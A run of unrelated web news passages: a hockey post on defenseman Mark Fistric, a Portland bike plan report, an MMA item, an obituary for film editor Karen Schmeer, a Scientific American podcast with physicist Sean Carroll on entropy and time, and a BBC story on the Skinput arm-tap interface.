It merits even more recognition when you realize how little he helps his own cause by getting in on the scoring .
1 goal and 9 assists are all he 's added this year , so he 's not exactly a " fantasy " kind of guy , but what he lacks in offense he more than makes up for with physicality and perseverance .
He 's been sent away multiple times by the old coaching staff and the new , and each time has come back a little stronger , so much so that the numbers are now starting to speak for themselves .
Nick Grossman , Matt Niskanen and Mark Fistric all saw time in the 2008 playoff run , but it was Fistric that was shown the healthy scratch seat when Zubov , Norstrum and Boucher were all healthy .
If that scenario were to play out again today , which of the three would get scratched ?
Not Fistric .
I would also venture to say that of those three , Fistric is the one we can expect the most improvement from going forward .
( This is meant to be a compliment to Grossman , who has accomplished so much already , not a detractor . )
Consider Fistric 's 58 games played this year :
20 games with a plus rating
Only 6 games with a minus rating
The other 32 ( obviously ) at an even +/- zero .
He leads the team ( among regular NHL contributors ) in advanced statistics like CORSI numbers .
+/- Leaders on Defense Since the Lockout :
Year Player +/- Rating 2009 - 2010 Mark Fistric +20 2008-2009 Stephane Robidas +10 2007-2008 Matt Niskanen +22 2006-2007 Jasroslav Modry +10 2005 -2006 Philippe Boucher +28
At an even one million dollars , a +20 rating going into tonight against the Sharks , and 23 years of age , I think it 's safe to say that Mark Fistric is a big positive this team has going forward on the blue line , and if this team ever landed that big # 1 D - man they need , imagine how a guy like Fistric looks anchoring your third pair .
( We can dream , ca n't we ? )
In the mean time , enjoy his much needed physicality and his continued development at a time when they sorely need it .
Fistric told the Morning News recently , " " I 'm trying to take the next step and trying to get better every game , and I think that 's pretty much the goal of every young defenseman , " Fistric said .
" You want to make good decisions , read plays well , be responsible and physical .
I do feel like I 'm getting better in a lot of areas . "
The
, envisioning a future when 25 percent of trips are made by bike , is expected to coast to approval when it goes before the City Council on Thursday .
It 's easy to green - light America 's most ambitious investment in bicycling when it would be funded down the road .
But according to city transportation officials , the plan to build 681 miles of new bikeways over the next 20 years will eventually cost $ 613 million .
By comparison , the
cost $ 575 million , and all transportation projects in the metro area add up to about $ 630 million a year .
Portland Mayor Sam Adams does n't flinch at the estimated cost .
He talks of making neighborhoods more livable , transportation more affordable and reducing greenhouse gas emissions 80 percent by 2050 .
" Can we do those things without this bike plan ? "
Adams said .
" I think it would be very difficult . "
Critics think the mayor and cycling advocates are dreaming .
For starters , the plan would require a new steady revenue stream .
" They want to make bicycling more attractive than driving for all trips of three miles or less , " said John Charles , president of the libertarian
.
" Nothing they do is going to make that happen for most people . "
The plan calls for an expansive interconneted bicycle network , new street designs and an array of education programs .
It also mandates studying " funding concepts " in coming months .
Some ideas – licensing and registration fees for bicyclists , a citywide sales tax on new bikes and advertising in bike lanes – would target just cyclists .
But a proposed " green transportation " bond would ask everyone to pay .
Even with the economy dragging , the bike plan is optimistic about property - tax increases because " Portland residents have repeatedly shown strong support for funding sustainable or green spaces initiatives . "
With hope , some city officials point to Washington County .
There , voters have repeatedly approved new property taxes to build 123 miles of bike lanes through the Major Streets Transportation Improvement Program .
Of course , that 25 - year - old road tax has always benefited more than one mode of commuting .
From the widening of Oleson Road to the Verboort roundabout , every improvement includes sidewalks for pedestrians and bike lanes ( or at least wider shoulders ) for cyclists .
" Everyone chips in , " said county spokeswoman Anne Madden , " and everyone benefits . "
By 2012 , the Washington County program 's $ 555 million in property - tax revenue is expected to have completed 111 projects on what were narrow farming roads a century ago .
By contrast , the 2030 Portland Bike Plan for the most part calls for separate funding sources for two - wheeled commuters .
Portland 's first Bicycle Master Plan was adopted in 1996 .
With only modest investment , the bicycle network has since doubled to more than 300 miles and bike commuting has boomed .
Last fall , the
data showed 6.4 percent of Portlanders reported bicycling to work in 2008 , a big jump from 4 percent the year before .
The 2030 Bike Plan projects an uptick of 400 percent .
To do that , the city is trying to appeal to Portlanders say they who want to commute by bike but do n't think it 's safe enough .
Through years of surveys and public outreach , PBOT has categorized 60 percent of residents as " interested but concerned " in bike commuting .
Where the 1996 plan emphasized bike lanes on busy streets , the 2030 plan proposes 314 miles of new separated bikeways and 256 miles of new bike boulevards with low automobile traffic that link to key destinations .
It also calls for more bike parking and increased maintenance budgets .
The new plan offers a heavenly two - wheeled vision of Portland in 2030 – " a clean , thriving city where bicycling is a main pillar of the transportation system and more than a quarter of all trips are made on bicycles . "
It also quotes H.G. Wells : " Cycle tracks will abound in Utopia . "
But one might think of George Orwell after visiting the city 's official bike plan web site , which encourages visitors to " click here to express your support . "
Oppose the plan ?
Have legitimate concerns about it ?
Sorry .
No link for you .
Since the public comment period opened in October , the Portland Bureau of Transportation city has received 202 comments .
Only 17 have been " clearly against " the plan .
Still , given the city 's shaky transportation budget and the fact that the so - called " Copenhagen on the Willamette " already is considered a world - class bicycling city , some wonder if the plan is even needed .
Charles wonders why , when technology and culture are changing at a rapid pace , Portland is planning 20 years into the future .
He compared it to a business in 1980 committing to 20 years of IBM typewriter purchases , unaware that the computer revolution was on the horizon .
Near Charles ' office in Raleigh Hills , Southwest Scholls Ferry Road turns treacherous once Washington County 's bike lanes and wide shoulders stop at the Portland city limits .
Although a multimodal property tax such the one supported by Washington County voters is n't in the bike plan , one city official said Portland is exploring the possibility of " something similar . "
At the same time , Geller said there will several opportunities for future federal funding .
When Congress undertakes the reauthorization of the surface transportation bill , for example , the city is expected to ask for $ 25 million for a citywide bicycle boulevard program .
More than $ 600 million for bicycle improvements " is definitely a big number and I appreciate that , " Geller said .
" But in transportation dollars , it goes a long way . "
By contrast , he said , " It would build only about 12 miles of urban freeway . "

Before his positive steroid test caused the fight to be scrapped , Josh Barnett was scheduled to fight Fedor Emelianenko in a heavyweight clash of the titans last summer .
Now Barnett is just a week and a half away from a return to MMA after more than a year off -- and he 's expected to face a slightly easier opponent than Fedor .
Josh Gross of SI.com reports that Barnett is likely to face Siala " Mighty Mo " Siliga at Dream.13 on March 22 .
That 's a rather embarrassing step down in quality of opposition for Barnett , and a reminder of just how far Barnett has fallen since eight months ago , when he was regarded by many as the No. 2 heavyweight in the world and a real threat to Fedor .
Mighty
Mo , for those who do n't know , is a 39 - year - old kickboxer from American Samoa who has a 3 - 1 MMA record and has never beaten anyone remotely credible ; the three guys he 's beaten have a combined record of 31 - 33 - 3.
Barnett vs. Mighty
Mo is , basically , a joke , but it 's a joke that will draw a fair amount of attention in the MMA world simply because Barnett is n't that far removed from being an elite heavyweight .
Beating
Mo does n't do anything for Barnett , but for Barnett , this is all about getting back into the ring .
Maybe it's a step toward getting back into the ring against an opponent who 's actually credible .
Karen Schmeer , the longtime Errol Morris editor who was hit and killed Friday night by a frenzied getaway driver , has been called “ one of the greatest editors of her generation . ”
The industry professional , who edited " The Fog of War " and many other documentaries , was crossing W. 90th Street yesterday when she was struck down by a car fleeing from the police .
Its driver and passengers had just robbed over - the - counter allergy medicine from a local CVS , and fled on foot from the scene of the accident with cops giving chase .
According to police , they tried to pull the Dodge Avenger sedan over at W. 86th and Amsterdam , but the driver sped on , hitting another car and then running straight in to Schmeer .
One felon , who police were able to grab , has been charged with second - degree murder .
The other two are still at large .
The 39 - year - old — whose current project was a documentary about chess champ Bobby Fisher — died at the hospital .
She ’d edited a number of Morris ’s documentaries from “ Fast , Cheap and Out of Control ” ( a film he thought might be “ completely uneditable ” ) to 2008 ’s “ Standard Operating Procedure , ” over which she clashed with the director .
But according to the NY Times , Morris said she was a great editor “ in part because she was difficult ; she was opinionated ; she brought a lot of her own ideas into the process . ”
Another colleague Greg Barker , director of “ Sergio , ” for which Schmeer took home an editing award at Sundance in 2009 , added that “ In a business full of huge egos — and believe me , she ’s worked with a few of them — she was completely modest and incredibly self - effacing about her immense talent . ”
Sean M. Carroll , theoretical physicist at the California Institute of Technology talks with podcast host Steve Mirsky ( pictured ) about his new book From Eternity to Here : The Quest for the Ultimate Theory of Time .
Plus , we test your knowledge of some recent science in the news .

Podcast Transcription
Welcome to Science Talk , the more or less weekly podcast of Scientific American posted on March 30th , 2010 .
I 'm Steve Mirsky .
This week on the podcast :
Carroll :
We all know time , we use it everyday all the time , but it 's not that many steps to go from the time that we use to unanswered questions about the universe .
Steve : That 's Sean Carroll , author of the new book , From Eternity to Here : The Quest for the Ultimate Theory of Time .
We 'll talk to him about the book , and we 'll test your knowledge of some recent science in the news .
First , Sean Carroll , he is a theoretical physicist at the California Institute of Technology where he studies cosmic inflation , the arrow of time and what happened at or before the big bang .
We talked on February 21st when we were both at the annual meeting of the American Association for the Advancement of Science in San Diego .
Steve : From Eternity to Here — What exactly do you mean by that title ?
Carroll :
Well , the point of my book is to talk about the arrow of time — the fact that the past appears to us different from the future even though the underlying laws of physics do n't treat them any differently .
And the nice thing is that it starts in the kitchen ; it starts in our everyday lives , the arrow of time — we remember yesterday , we do n't remember tomorrow — but the explanation for it is to be found in the big bang or even what happened before the big bang .
So thinking about why the past appears different than the future to us is something that connects our everyday lives to our notions of eternity .
Steve : I have found the connection by the way between you , the physicist Sean Carroll , and the molecular biologist , evolutionary biologist , Sean Carroll , and that is the egg .
Carroll :
The egg , yes , was very important .
Steve :
He studies how the egg develops and how that relates to evolution overall and for you it 's how the egg cannot be unscrambled .
Carroll :
That 's right .
It means some metaphorical power as the egg is the origin of things and Sean " B. for biologist " Carroll talks about the origin of life and I talk about the origin of the universe .
Steve :
So your book has a very specific architecture .
There are four major sections of the book .
Carroll : Right .
Steve :
And why do n't we go through those if you ’d like to …
Carroll : Sure .
Steve : Just talk about each section , why you built the book this way and where we ultimately wind up .
Carroll :
Well I think it 's something where it would n't have been good to go absolutely in logical order or a chronological order for that matter in the book .
So part 1 is the rapid overview of the terrain , the map of what the issues are .
So we talk about , what do you mean by time , what is [ the ] definition of time .
We talk about what is the definition entropy in the second law of thermodynamics that really gives force to the arrow of time .
Steve :
You actually were standing in line at a DMV office .
Carroll : Yes .
Steve :
And you did an experiment with lay people .
Carroll :
That 's right .
Steve :
You want to talk about that just briefly .
Carroll :
Well I think that you know as physicists we have definitions in our brains and we use words like time or energy and dimension , things like that , and it 's very , very useful if you 're trying to explain these concepts to people on the street , see what they have in mind .
And I think it 's very enlightening because physicists , if you ask them what time means , [ will ] talk about coordinates or what clocks measure or things like that , whereas to people on the street who 're not trained as physicists , they think of time as some sort of medium through which we move and distinguishing the different aspects of time they think is [ an ] important thing to do .
Steve :
So you actually asked lay people , while you were line at the DMV , " How do you perceive time ?
What do you think time is ? " and they did n't move away ?
Carroll :
They did n't run away , but they did n't give me their spot in line .
You know , I ask people in line , I ask people , you know , at restaurants or in airplanes or so forth .
That is where sort of , [ I could hear ] people talk about time in their own words so that I was n't putting ideas into their heads .
Steve : I interrupted you .
Go back to where we were …
Carroll :
So yes , part 1 of the book is just an overview .
What is time ?
What is entropy ?
What is universe ?
What is the arrow of time ?
How does cosmology fit into things ?
So you know , so we 're going to , sort of , in the rest of the book do all this better , but [ I ] want to get in people 's minds — what are the stakes , what are the questions we 're trying that we 're trying to answer ?
Steve :
Why do n't you explain very briefly what entropy is for people who might not be familiar with that answer .
Carroll : Yeah entropy is the absolutely key concept .
It has a long history from the 19th century with people who [ were ] trying to build better steam engines .
But basically entropy is just a measure of how disorderly things are .
Things in the universe naturally go from a state of organization , low entropy orderliness , to disorganization , and we call that high entropy .
On a more technical level , the entropy measures the uselessness of some amount of energy , you know , useful energy like your gasoline , you can use that gasoline , burn it in your car to get you somewhere .
One you 've burnt it , the energy of the universe is the same , energy is conserved , but it 's now useless ; you create a lot of entropy in the course of burning the gas .
And the point is the entropy increases with time , that 's the second law of thermodynamics .
The first law just says the total energy is conserved .
The second law says that entropy goes up and up as the universe ages .
So that 's what gives time an arrow , that 's what tells the difference between the past and future , in fact , the entropy was low in the past , it will be higher in the future , in that simple idea underlies all the different ways , in which there 's an arrow of time .
Steve :
The way I was taught thermodynamics was the first law is you can't win , the best you can do is break even , and the second law was you can't even break even .
Carroll : Ca n't break even , and the third law is you can't even get out of the game .
So , you 're stuck .
And then so in part 2 of the book , we start getting down [ to ] the nitty - gritty and we think about time in terms of how Einstein explains space and time to us , special relativity , general relativity , gravity as a manifestation of the curvature of space - time , and also the idea of time machines , time travel and you actually travel into the past ; and again we do a little foreshadowing , because I say that it 's probably not possible to travel to the past , but if you could the thing that seems paradoxical to us or troubling to us about the prospects of time travel can be traced to the arrow of time , can be traced to the fact that if you mix up the past with the future by having a time machine then there is no consistent arrow of time — one persons past is another person 's future — and that 's what gives us the willies about traveling to the past .
So then part 3 is really the heart of the book , part 3 of the four parts [ is ] where we talk about entropy at a detailed level .
We talk about Ludwig Boltzmann , the Austrian physicist , who is the great hero of statistical mechanics in thermodynamics .
Steve : I think his equation is on his gravestone .
Carroll :
He has an equation on his gravestone and it's not even the equation call the Boltzmann equation .
You know , he has more than one really worldly important equation .
I think , that Boltzmann deserves to be up there in the pantheon of physicists who people on the street would recognize the names of , you know , the Newton , Galileo , Einstein level of physicists ; Boltzmann should be up there .
So I hope that my book does something [ to ] raise his profile .
And so we talk about reversibility , for example .
I have a whole chapter that I think is talking about a concept that a lot of physics book [s ] assume people understand , if you do n't go into great detail about namely , the paradigm of how physics works : that if you understand the universe now , and you understand the laws of physics and you can predict with perfect fidelity what the universe will be like at some moment in the future , then you can retrodict what the universe was like at some moment in the past .
The universe is defined by its state at any moment in time .
That 's a very deep concept and [ I ] , sort of , show what that means how it could 've been different and how it plays out .
And then we go into entropy and Boltzmann and how it works and then the good news about Boltzmann 's understanding as he showed why entropy would tend to go up as we observe it to do , but then the hole in his argument , the unsolved puzzle , is why it was ever low in the first place .
Steve :
And one of the key points is entropy was very low at the big bang and it has been increasing ever since , and so then the obvious question was what was it doing being so low at the big bang ?
Carroll :
That 's absolutely right , because what Boltzmann taught was [ that ] what entropy is , deep down in its guts , is a way [ of ] counting the number of ways you can rearrange atoms or elementary particles or what have you without noticing macroscopically , right ?
So , if we have an egg , you notice that there is an egg shell and a [ n ] egg white and a yolk , but if you change some of the molecules around within the yolk you would n't notice , but if you started changing yolk molecules around with egg white molecules , you would notice .
So the more messy and , sort of , mixed up something is the higher the entropy , because there [ are ] more ways to rearrange it .
So if you say that the early universe has a low entropy , which is a true statement , what you 're saying is the universe is in a very , very special state , one of only a small number of possible arrangements .
So that becomes puzzling , that sounds like a clue to something that we do n't [ even ] understand — why was the early universe so special ?
Steve :
You say in the book that the universe , is n't really the way it " should be " ?
Carroll :
That 's right .
Steve :
So how should it be , how is it not that way and what does that tell us ?
Carroll :
Well , that 's part 4 of the book .
We talk about , you know , now that we 've gone through what entropy means and what its puzzle is in part 3 , in part 4 we try to relate it cosmology , relate to what we know about the observable universe .
And again I try to be clear that the question , what should the universe look like ?
is not one we have one clear , obviously correct answer to .
We can sort of make some guesses , but when we think about entropy and we think that high entropy corresponds to a natural state , there are many , many , many ways to be high entropy .
Low entropy corresponds to something delicately tuned , so that 's why it 's easy for entropy to go up .
There 's more ways to be high entropy than low entropy .
So if the universe is low entropy then it 's delicately tuned , and that does n't seem the way that it should be .
[ You know , ] what did the tuning ?
It 's okay to imagine that the universe is in a low entropy state , but it seems to imply there 's an explanation , there 's a mechanism , there 's some laws of physics that makes the universe that way at early time [s ] .
So in part 4 , I go through a bunch of possible explanations that you might consider , and tell you why none of them are really very satisfying .
And in the end I suggest that , well maybe our universe is part of a much bigger multiverse , that the universe we see is not all there is ; there are other regions and our big bang is actually part of a much bigger system that has [ a high ] entropy [ but ] never [ theless ] the entropy can get higher and higher by the much bigger universe creating new universes , and we 're a baby universe that branched off of a much bigger system .
It 's very , very speculative , it 's not something that I 'm proclaiming to be necessarily the right answer , but what I try to emphasize is that something like this is what we need to be thinking about .
We need to be thinking about models for the large - scale evolution of the universe , where the big bang is not the beginning , the big bang is explained by something preexisting to that and that 's really the only hope I think we have of dynamically coming up with a reason why our observed universe had a low entropy at early times .
Steve :
Our big bang is a budding off of this other , more massive system that we can't get a look at .
Carroll :
That 's right and there 's various ways that might happen .
I talk about one or two ways in the book , but even if we do n't know the details of that mechanism yet , it could still be you know , logically a good , sensible answer to the problem .
I think that right now , the problem with [ the ] arrow of time and its connection to cosmology is not just that we do n't know which theory is right , but the theor [ ies ] that we 're thinking about these days do n't even address the problem , they do n't even try .
So , I think that , you know , once you have that problem in mind [ it affects ] what you call a sensible theory of cosmology it 's really a very strong constraint on your models .
Steve :
Have you as a reader , maybe as a listener , am I entitled to possibly be a little bit frustrated that you 've just added another tortoise to the line of tortoises that are holding up the universe ?
Carroll :
Well , I think it 's a very good question , but I think that there 's an answer to it .
I mean , I think that what counts as an explanation is [ if you ] can explain something complicated in terms of something simple .
So , it is certainly true that if you start thinking about the multiverse , you 're adding a lot of universes okay ; the number of universes goes from one to infinity .
So , it does not seem like progress in terms of explanatory concision .
However , the multiverse is not the starting point , the multiverse is a prediction [ of ] a way of thinking about gravity and quantum mechanics , and so if you can blend together what we know about space - time [ according ] to Einstein with what we know about quantum mechanics [ according to ] the giants of early 20th - century physics , it seems very natural to think that the universe does not sit there ; there 's no place the universe can just settle in and stay that way forever .
And the good news is that that 's what you want to help explain the arrow of time .
If there were a way the universe could just sit there unperturbed forever , it probably would .
Why would n't it ?
Why would n't we have reached that state a long time ago ?
You have a puzzle that goes back to Boltzmann himself , where he says that if the universe is just an equilibrium — so the universe is like the gas in a room or that is sort of uniformly distributed , not changing over time , just sort of sitting there forever and ever — well , you might think that that 's not changing , but really at a subatomic level or the atomic level , there 're fluctuations , there 's random things occurring .
So if you have a box of gas that lasts literally forever , the gas molecules in that box will find themselves in every possible arrangement over the course of time and those arrangements include a human being or a [ goldfish ] or a solar system if the box of gas is big enough .
And that 's not a benefit , that 's a bit of a problem because that 's [ says that if ] the universe lasts forever , just through its sort of random rearrangements of its constituents , we could be there .
You know , something like us could exist ; that 's not disallowed by the laws of physics .
And then why are n't we there ?
That does n't seem to be the universe in which we live .
We live in this incredibly rich universe that has not just you and me , but a planet and we have a star in a galaxy and there are a hundred billion other galaxies .
So it does n't look to us like we 're just random fluctuations in some eternally existing thing , but why not ?
And that becomes a big puzzle .
Steve :
You know , I felt like my cat was being threatened numerous times in the course of reading your book ; you kept saying that my cat just might disappear at any moment .
Carroll : Well , we tried in the book not to harm any animal [s ] either conceptually or literally .
I think that it 's very funny when you look at all these thought experiments that scientists do , they 're always killing cats and dogs and things like that .
So , I 'm just sort of feeding them and sending them on journeys ; I 'm not actually killing anybody .
Steve : I want to go back to something we were talking about .
The concept of over 100 years ago that if you understood everything about every particle of the universe at this moment , you could both predict the future and what 's the word you use ?
Carroll : Retrodict the past .
Steve : Retrodict the past ?
Right , but you discuss in the book how there was this contest for the king of Sweden .
Carroll :
That 's right .
He had a birthday coming up , and which mathematician was it again ?
Steve : Poincaré .
And why do n't you tell the story ?
Carroll :
So yeah , King Gustav was having a birthday coming up — and it was the 19th century ; things were a little bit more highbrow back then — so , he decided to celebrate this birthday by having a mathematics competition .
The Swedish mathematicians proposed various puzzles and they said , you know , the best solution to [ any of ] these puzzles will win the competition .
Poincaré , who was a famous French mathematician at the time tried to answer one of these puzzles , which was to basically prove that the solar system , the planets moving around the sun , is stable , that the planets do not go wandering off into the cosmos , if you wait long enough .
And he wrote an essay , he claimed to prove it .
He did n't prove the whole thing ; he just looked at three bodies .
So , the sun and two planets , so it was a much simpler system .
But he says , yes here ’s the proof that its stable and it was a big success , they granted him the prize , they [ were ] about to print up this essay in the winning journal and he realized he made a mistake .
One of the people who read his article found a loophole , send it back to him and in trying to close the loophole , Poincaré actually ended up proving the opposite of what he had claimed , the solar system is not stable .
And this is an example of what we now know as chaos theory .
And , in fact , given the three planets orbiting each other , you cannot predict with perfect accuracy — starting from incomplete data , starting from imprecise initial conditions — you have very little control over what the far future will look like .
So that 's as a practical matter , a huge problem for this project of predicting the future , given the present because we never have perfect information about what the present is .
On the other hand , that was never a practical matter anyway ; we were never claiming to know even approximately the position and velocity of every atom in your body or anything like that .
So I think people have made a big deal out of chaos being a roadblock for this dream of determinism : Starting from the present you can predict the future .
But I think it 's a little bit overblown actually because I think it 's a practical problem , not a problem of principle .
It still remains true that if you did have perfect information about the state today , you could predict the future and no one ever expected that there was anything other than a matter of principle , no one ever expected that we would have an approximate knowledge of the current state of the universe and therefore approximately predict the future .
I think it 's a very different question .
So at the level of the fundamental laws of physics , the questions about whether or not the future is determined by the present is still a very good question , and chaos theory does n't quite answer it .
Steve :
Why did you decide that you wanted to write this book .
I mean , it 's not for everybody , but it 's certainly aimed at a nontechnical audience .
Carroll : Oh , absolutely .
I mean it might not be for everybody because no book is , but it 's certainly for people who want to think about the universe without , you know , having any preparation for doing so , any training in doing so and I try to connect it to other things .
There 's you know , little quotes from literature and movies and things like that , but the ideas are big and they 're abstract and they require having an open mind and being willing to think about them .
It 's not like you have to go through lot of equations , but you do have to open your conceptualization of space and time and what that means to ideas that most people are n't familiar enough with , but I think that in fact it 's a perfect venue for doing that because time is something we all experience .
You do n't need to first be convinced that time is interesting , you know , it 's not like a black hole or a quark , where you have to first be told what it is .
We all know time , we use it everyday , all the time , but it 's not that many steps to go from the time that we use to unanswered questions about the universe .
And so it 's a good way to make this transition from questions we 're all familiar with to questions of the origin of everything we see .
Steve :
And it 's just fun to think about this stuff .
Carroll :
It 's absolutely fun to think about this stuff , especially the slightly counterfactual questions :
If the universe , were a little bit different , how would we perceive it ?
And it can be very , very different , and it's hard for us to quite think in those way because the arrow of time , the increase of entropy is so engrained in how we live .
The reason why we remember yesterday and not tomorrow is dependent on the fact that entropy is increasing , so if you do n't have a consistent arrow of time , like the time machines , or if we do n't have any arrow of time , at all , if you 're really in thermal equilibrium , then all of our notions of cause and effect go out the window , and it's a very different way of thinking about the universe .
Steve :
What if any kind of practical things you get out of working on this material ?
Carroll :
Well , I think that the things that most excite me are not the practical ones .
I 'm curiosity driven in my own research .
I do n't know where the universe came from but when you read about it , it 's certainly true that even if we think we understand the mechanics of entropy and how that plays out in eggs or melting ice cubes or something like that , there 's a tremendous number of connections that we have n't yet made .
I can say that the reason why I remember yesterday but not tomorrow is because entropy is increasing , but okay tell me exactly how that gets reflected in the operation of the brain .
And it becomes complicated and we do n't know the answers even at the level of computers that are mechanistic and understandable , things like Maxwell ’s demon come into play .
And really once again [ it 's ] very easy to start asking questions at the cutting edge of things we do n't [ know ] .
We understand entropy pretty well , we do n't understand complexity , we do n't understand simplicity versus complexity , which is sort of parasitic upon the growth of entropy .
So , I think there 's just a lot of room to move in many different directions in improving connections between what we do know about entropy and how that relates to other areas of science .
Steve :
You have a very nice discussion of Maxwell 's demon in the book , for anybody who 's looking for it ; you could also find it in a Scientific American article from well maybe the 1940s or 1950s , I think .
Carroll : Right , yeah , I learned only while writing this book that sort of the final nail in the coffin of Maxwell 's demon was not nailed in until 1980s .
You know , it took us a century to really figure out how to reconcile the thought experiment of Maxwell with everyone 's belief that entropy is going to increase in a closed system .
For those people who do n't know , Maxwell ’s demon was a suggestion by Maxwell of a way entropy could spontaneously decrease .
He had a little box that was in two halves and he had a little demon that sort of washed the box and let all of the fast moving molecules go into one half and all the slow moving molecules go into the other half .
So the box went from being uniform temperature to being hot on one side and cold on the other side ; that is a decrease in entropy .
But the second law of thermodynamics says that can't happen and of course everyone knows that the answer must be that somehow the demon has the entropy and the demon is increasing its entropy , but putting our fingers on exactly how that happened took a century of work .
And it turns out that the way that it happens is the demon needs to have a memory of which molecules are moving fast , which molecules are moving slow and if the demon has a notepad that it can record that information on and that notepad is finite , then at some point you gotta erase that information and that increases the entropy of the universe .
And in my book what I do is I use this as a paradigm to think about living organisms .
You know , living organisms , as any good creationist will tell you , seemed to fly in the face of the second law of thermodynamics .
The earth started fairly simple and now we have all this complicated structure in the biosphere , so where did that come from ?
And in some sense the living organism is trying to avoid the repercussions of the second law thermodynamics by not winding down .
And of course its easy to show that it does n't violate the second law of thermodynamics because the sun is giving us a lot of low - entropy energy , and we 're putting it back in a high - entropy form back into the universe .
But the mechanism once again , the actual way in which it plays out — so why do you need these complicated structures like human beings to make that happen ?
That 's something we do n't completely understand right now , so I think it 's a great area for research .
Steve :
Our physiology is sort of a Maxwell 's demon .
It keeps us at 98.6 instead of allowing us to go into equilibrium with whatever the ambient temperature is .
Carroll :
That 's exactly right , that ’'s the point I make in the book and I think that you know , Maxwell ’s demon is trying its best to stay out of equilibrium , right , that 's what its trying to do and …
Steve : [ Because then ] you 're dead .
Carroll : Because then you die , that 's right .
So any good living organism worth [ its ] salt does n't want to die , so it needs to leach energy out of the environment , increase the entropy of that energy and then give it back ; so it 's increasing the entropy of the universe [ while ] maintaining its own low - entropy state .
Steve :
You 've put in a good word for thermodynamics .
Carroll : Very happy to do that .
Steve :
Because we do n't have equations in the book but if anybody is willing to get into a thermodynamic course and actually see the equations , I just remember thinking it was the coolest thing , no pun intended .
Carroll : Yep .
Well , I think in fact , in my own education I did n't appreciate thermodynamics as much as I should have the first time around .
But it 's because , you know , the [re 's something ] physicists love , which is to immediately go to the simplest possible system .
[ This ] goes back to Galileo , right , saying ignore air resistance when we drop things from the Leaning Tower of Pisa ; we 'll put it in later .
You know , it 's sort of an annoyance and thermodynamics is all about that annoyance , it 's all about the fact that there 's a messy world out there with dissipation and friction and noise and things like that but the understanding of that is really a connection between the beautiful fundamental principles of physics and the messy reality of the world .
And in fact the connection turns out actually pretty elegant and compelling in its own right .
Steve : Now , these guys are trying to design better steam engines .
Carroll :
That 's right and there was lot of sort of national competition , the French versus the British and so forth to get the best steam engines and along the way , they invented the laws of thermodynamics .
Steve :
Which help us to understand the way the entire universe operates .
Carroll : Absolutely and vice versa .
Hopefully , the universe is going to help us understand the origin of those laws .
Steve : I thought you [ were ] going to say help us build better steam engines .
Carroll : That [ would ] be good , too , and in fact , that 's true .
You know , one of these things that a lot other people , even back to Poincaré and Einstein who are fundamental in inventing relativity , we think of , you know , relativity as being one of the most abstract mathematical topics in physics .
But we think of Einstein as being the sort of the exemplar of the head in the clouds physicists , but you know , he was a patent clerk and that was not simply an accident .
The thing that was being patented when Einstein was working in the patent office were clocks .
Telling time was a crucial thing [ at ] the moment [ and ] people realized that clocks in different places might behave differently .
Poincaré worked in the bureau of longitude making maps and he realized that once again making a map is not necessarily an objective representation of [ a ] sort of territory .
And these very practical concerns helped Einstein and Poincaré and their predecessors who invented thermodynamics to come to out these great abstracts [ leaps of ] logic .
Steve : Sean Carroll 's book is From Eternity to Here .

And now it 's time to play TOTALL ……. Y BOGUS .
Here are four science stories ; only three are true .
See if you know which story is TOTALL ……. Y BOGUS .
Story number 1 : Kidney donors live just as long as people with both kidneys .
Story number 2 : India and Bangladesh can stop fighting over who owns the island called New Moore Island by India and South Talpatti by Bangladesh because it 's gone , swallowed by the sea .
Story number 3 : Authorities in Tampa , Florida have finally captured a rhesus monkey that 's been on the loose for at least a year .
And story number 4 : A survey of over 50 depiction [s ] of the Last Supper painted in the last thousand years finds that the portion sizes keep growing .
( clock ticking )
And time 's up .
Story number 1 is true .
People who donate one of their kidneys live just as long on an average as nondonors .
That 's according to a study in the Journal of the American Medical Association .
Seems that if you have both kidneys , they 're each little slackers working less than full strength .
If one kidney is removed , the other gets up to 25 percent bigger , up to 30 percent more efficient .
The biggest risk is in the three months immediately after surgery , when donors do have eight times the already very low risk of death that they normally have .
That jump in the risk translates to 3.1 deaths out of every 10,000 donors .
Story number 2 is true .
The island in dispute by India and Bangladesh has disappeared .
It 's not clear how much of the disappearance is due to erosion or rising seas or other factors .
What is known is that a meter rise in sea level would wipe out about 17 percent of Bangladesh 's land , currently home to some 20 million people .
And Story number 4 is true .
The portions shown in various paintings of the Last Supper have grown by 70 percent over the last millennium , indicating that the trend toward supersizing is an older one than we may have thought .
For more check out the March 25th of the daily SciAm podcast , 60 - Second Science .
All of which means that Story number 3 , about the capture of that rhesus monkey in Tampa , is TOTALL ……. Y BOGUS .
Because the critter still roams free .
In fact , the latest development is the discovery that he has apparently built up immunity to iocaine powder ; I mean to the tranquilizer in the dart they 've hit him with .
Or he 's just got really good at plucking the darts out before the drug can take effect .
An official with the Florida Fish and Wildlife Conservation Commission , apparently upset at being asked how the monkey was outsmarting its hunter said , " This monkey is not outsmarting us ; this monkey is getting away based on its athletic ability developed over years and years of evolution . "
And whatever helps us sleep at night .
The monkey 's Facebook page — that 's right , I said it , its Facebook page — is Mystery Monkey of Tampa Bay .

Blame It On The Big Bang "

Technology correspondent , BBC News
The sensors can spot many different locations on the arm Tapping your forearm or hand with a finger could soon be the way you interact with gadgets .
US researchers have found a way to work out where the tap touches and use that to control phones and music players .
Coupled with a tiny projector the system can use the skin as a surface on which to display menu choices , a number pad or a screen .
Early work suggests the system , called Skinput , can be learned with about 20 minutes of training .
" The human body is the ultimate input device , " Chris Harrison , Skinput 's creator , told BBC News .
Sound solution
He came up with the skin - based input system to overcome the problems of interacting with the gadgets we increasingly tote around .
Gadgets cannot shrink much further , said Mr Harrison , and their miniaturisation was being held back by the way people are forced to interact with them .
The size of human fingers dictates , to a great degree , how small portable devices can get .
" We are becoming the bottleneck , " said Mr Harrison .
A finished device would be far smaller than the bulky prototype
To get around this Mr Harrison , a PhD student in computer science at Carnegie Mellon and colleagues Desney Tan and Dan Morris from Microsoft Research , use sensors on the arm to listen for input .
A tap with a finger on the skin scatters useful acoustic signals throughout the arm , he said .
Some waves travel along the skin surface and others propagate through the body .
Even better , he said , the physiology of the arm makes it straightforward to work out where the skin was touched .
Differences in bone density , arm mass as well as the " filtering " effects that occur when sound waves travel through soft tissue and joints make many of the locations on the arm distinct .
Software coupled with the sensors can be taught which sound means which location .
Different functions , start , stop , louder , softer , can be bound to different locations .
The system can even be used to pick up very subtle movements such as a pinch or muscle twitch .
" The wonderful thing about the human body is that we are familiar with it , " said Mr Harrison .
" Proprioception means that even if I spin you around in circles and tell you to touch your fingertips behind your back , you 'll be able to do it . "
" That gives people a lot more accuracy then we have ever had with a mouse , " he said .
